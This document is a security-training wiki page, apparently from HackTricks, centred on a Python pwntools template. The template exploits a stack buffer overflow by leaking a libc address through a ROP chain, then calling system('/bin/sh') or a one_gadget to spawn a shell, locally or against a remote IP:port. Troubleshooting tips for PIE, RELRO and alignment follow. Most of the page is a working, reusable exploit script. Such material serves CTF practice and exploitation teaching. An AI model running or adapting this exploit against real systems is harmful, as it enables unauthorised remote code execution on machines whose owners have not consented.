# Leaking libc - template

{{#include ../../../../banners/hacktricks-training.md}}

```python:template.py
#!/usr/bin/env python3
"""
Updated ROP template (2025-08) for leaking a libc address and getting a shell.
• Works with PIE / non-PIE binaries (64-bit)
• Handles 16-byte stack alignment automatically
• Easily switch between LOCAL/REMOTE/GDB with cli flags
• Compatible with recent pwntools (≥4.13) and glibc ≥2.39
"""
from pwn import *  # pwntools ≥4.13 recommended
import argparse, string, subprocess

###################
###   CONTEXT   ###
###################
context.binary = ELF("./vuln", checksec=False)  # local copy of the target
context.arch   = context.binary.arch
context.log_level = "info"  # change to "debug" for verbose output

# Helpful one-liners for modern ubuntu images
# $ pwninit  # auto-patches binary & drops solve.py (see refs)

###################
###  ARGUMENTS  ###
###################
parser = argparse.ArgumentParser()
parser.add_argument("--remote", metavar="IP:PORT", help="remote host, ex 10.10.10.10:1339")
parser.add_argument("--ssh",   action="store_true", help="spawn via ssh stub (edit creds)")
parser.add_argument("--gdb",   action="store_true", help="attach gdb at launch")
parser.add_argument("--libc",  help="supply external libc (auto used when provided)")
args = parser.parse_args()

LOCAL_BIN = str(context.binary.path)
LIBC      = ELF(args.libc) if args.libc else None
ENV       = {"LD_PRELOAD": args.libc} if args.libc else {}

###################
###  CONNECTION  ###
###################
if args.remote:
    host, port = args.remote.split(":")
    P = remote(host, int(port))
elif args.ssh:
    ssh_shell = ssh("user", "host", password="pass", port=22)
    P = ssh_shell.process(LOCAL_BIN, env=ENV)
else:
    P = process(LOCAL_BIN, env=ENV)

if args.gdb and not args.remote and not args.ssh:
    gdb.attach(P, gdbscript="b *main")

ELF_LOADED = context.binary  # alias
ROP_LOADED = ROP(ELF_LOADED)

#########################
#### OFFSET FINDER  #####
#########################
OFFSET = b""  # b"A"*264  – leave empty to bruteforce with cyclic()
if OFFSET == b"":
    log.info("Calculating offset with cyclic pattern …")
    P.sendline(cyclic(600))
    P.wait()
    core = P.corefile
    offset_val = cyclic_find(core.read(core.rsp, 4))
    log.success(f"Crash offset: {offset_val} bytes")
    exit(0)

####################
### Find Gadgets ###
####################
libc_func  = "puts" if "puts" in ELF_LOADED.plt else "printf"
FUNC_PLT   = ELF_LOADED.plt[libc_func]
MAIN_PLT   = ELF_LOADED.symbols.get("main", None) or ELF_LOADED.entry
POP_RDI    = ROP_LOADED.find_gadget(["pop rdi", "ret"])[0]
RET        = ROP_LOADED.find_gadget(["ret"])[0]  # for stack alignment

for name,val in {"MAIN":MAIN_PLT, libc_func.upper():FUNC_PLT, "POP_RDI":POP_RDI}.items():
    log.info(f"{name}: {hex(val)}")

########################
### Leak libc addr   ###
########################

def align(payload: bytes) -> bytes:
    """Ensure 16-byte RSP alignment for glibc ≥2.29."""
    return payload if len(payload)%16==0 else payload + p64(RET)


def leak_libc(sym:str = libc_func):
    func_got = ELF_LOADED.got[sym]
    log.info(f"{sym} GOT @ {hex(func_got)}")

    rop  = b"".join([
        p64(POP_RDI), p64(func_got),
        p64(FUNC_PLT),
        p64(MAIN_PLT)
    ])
    payload = align(OFFSET + rop)
    P.sendlineafter(b"\n", payload)

    leak = u64(P.recvline().strip().ljust(8,b"\x00"))
    log.success(f"Leaked {sym}: {hex(leak)}")

    if LIBC:
        LIBC.address = leak - LIBC.symbols[sym]
        log.success(f"libc base → {hex(LIBC.address)}")
    else:
        log.warning("No external libc provided. Use https://libc.blukat.me or libc-database to identify it.")
        P.interactive()
        exit(0)
    return leak

leak_libc()

#############################
#### FINAL EXPLOITATION #####
#############################
USE_ONE_GADGET = False  # toggle on demand


def get_one_gadgets(libc_path_or_base:str):
    """Return list of one-gadget offsets using the one_gadget gem."""
    try:
        output = subprocess.check_output(["one_gadget", "-r", libc_path_or_base]).decode()
        return [int(x,16) for x in output.split()]  # list of ints
    except Exception as e:
        log.warning(f"one_gadget failed: {e}")
        return []

rop_chain = b""
if USE_ONE_GADGET:
    og = get_one_gadgets(args.libc)[0]
    rop_chain = p64(LIBC.address + og)
else:
    BINSH  = next(LIBC.search(b"/bin/sh"))
    SYSTEM = LIBC.sym["system"]
    rop_chain = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)

payload2 = align(OFFSET + rop_chain)
P.sendlineafter(b"\n", payload2)
P.interactive()
```

> **Why the RET for alignment?**  
> Since glibc 2.29 the stack *must* be 16-byte aligned when a function is entered via `ret`; otherwise `_dl_runtime_resolve()` crashes. Adding an extra `ret` gadget fixes this for most leaks/ROP chains.

## Modern tips (2023-2025)

* **PIE binaries** – When the target was compiled with `-pie` (check with `checksec`), every address you leak from the *binary* itself (not libc) must be used to compute the PIE base: `pie_base = leaked_addr - elf.symbols['known_sym']`. Add that base to every further gadget offset.
* **Full RELRO** – If the binary has *Full RELRO*, the GOT is read-only, but you can still *read* entries to leak libc. You just cannot overwrite them.
* **Multiple libraries** – Recent CTFs often ship both `libc.so.6` *and* a custom `libm.so`. Use `pwninit` ≥3.3 to automatically patch the binary so that it loads all supplied libs and generate a skeleton solve script.
* **gl﻿ibc 2.34+** – `__libc_start_main_ret` and `__libc_csu_init` offsets changed; prefer leaking a stable symbol like `puts` or `printf`.

## Common problems

### MAIN symbol missing in stripped PIE binaries
Use any leaked code pointer to compute the PIE base and set `MAIN_PLT = pie_base + offset` (main offset can be taken from `IDA`, `Ghidra` or `readelf -s`).

### `System` executes but no shell returned remotely
Make sure to pass a *valid* `/bin/sh` pointer (musl images don’t have the string; use an RW segment and `read` it first) and remember remote filters that may close stdio.

### Stack mis-alignment causes `munmap_chunk(): invalid pointer`
If the process crashes right after leaking, the stack is likely un-aligned. Insert an additional `RET` gadget before your chain (already automated in `align()` helper).

## References

- pwninit – Automate patching binaries and supplied libc, GitHub (io12)  
- Pwntools documentation – Context, ROP utilities (https://docs.pwntools.com)

{{#include ../../../../banners/hacktricks-training.md}}
